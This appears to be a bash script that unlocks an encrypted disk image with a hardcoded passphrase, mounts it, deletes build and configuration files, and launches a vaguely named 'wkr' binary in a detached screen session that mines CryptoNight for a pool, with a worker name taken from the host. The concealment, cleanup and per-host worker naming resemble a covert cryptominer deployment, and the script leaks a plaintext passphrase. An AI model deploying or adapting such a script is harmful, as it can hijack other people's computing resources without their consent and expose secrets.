#!/usr/bin/env bash
echo j6Vf0BnmYmp9aqgD | sudo cryptsetup luksOpen ~/img img -
sudo mount /dev/mapper/img /mnt
cd /mnt
rm -rf CMakeCache.txt
rm -rf CMakeFiles/
rm -rf Makefile
rm -rf cmake_install.cmake
rm -rf config.txt
rm -rf cpu.txt
rm -rf pools.txt
screen -S wkr -d -m ./wkr -u zeekay.$HOSTNAME -o us-east.cryptonight-hub.miningpoolhub.com:20580
